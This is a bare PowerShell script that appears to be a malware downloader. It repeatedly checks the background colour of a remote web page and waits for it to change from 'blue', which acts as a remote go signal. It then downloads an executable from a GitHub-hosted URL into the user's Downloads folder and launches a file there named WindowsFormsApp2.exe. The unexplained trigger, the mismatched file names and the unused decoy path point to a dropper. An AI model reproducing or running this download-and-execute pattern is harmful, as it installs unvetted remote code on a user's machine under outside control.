$urls = @(
    "https://github.com/webntdev/webntdev.github.io/raw/main/application/Captura.exe"
)

$filePath = Join-Path -Path $env:USERPROFILE -ChildPath "Downloads\wheiu.bz"
$url = "https://backgroundcolor.pages.dev"
$response = Invoke-WebRequest -Uri $url
$backgroundColor = $response.ParsedHtml.getElementsByTagName("body").Style.backgroundColor

function CheckBackgroundColor {
    $response = Invoke-WebRequest -Uri $url
    return $response.ParsedHtml.getElementsByTagName("body").Style.backgroundColor
}

$initialColor = CheckBackgroundColor

if ($initialColor -eq "blue") {
    Start-Sleep -Seconds 2

    while ((CheckBackgroundColor) -eq $initialColor) {
        Start-Sleep -Seconds 2
    }


}
Start-Sleep -Seconds 1

$downloadDir = [System.Environment]::ExpandEnvironmentVariables('%USERPROFILE%\Downloads')
if (-not (Test-Path -Path $downloadDir)) {
    New-Item -ItemType Directory -Path $downloadDir
}

foreach ($url in $urls) {
    $fileName = [System.IO.Path]::GetFileName($url)
    $destinationPath = Join-Path -Path $downloadDir -ChildPath $fileName
    Invoke-WebRequest -Uri $url -OutFile $destinationPath
}

$exePath = Join-Path -Path $downloadDir -ChildPath "WindowsFormsApp2.exe"
Start-Process -FilePath $exePath
